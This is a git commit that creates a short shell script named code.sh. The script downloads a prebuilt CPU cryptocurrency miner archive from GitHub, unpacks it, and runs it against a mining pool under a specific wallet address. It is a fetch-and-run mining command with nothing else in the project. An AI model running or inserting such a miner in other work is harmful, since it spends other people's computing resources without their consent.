9e7a14299e390fa02b92e2666dca4f57b30c603f
Adithya-Vedula <109824450+Adithya-Vedula@users.noreply.github.com>
2023-01-01 10:24:46 +0400

    Create code.sh

---
+++ code.sh
@@ -0,0 +1,3 @@
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar -xf hellminer_cpu_linux.tar.gz
+./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RSH54L6YE6iooXyqk6FLG8gz9HaXJjpq1L.adi3 -p x --cpu 4
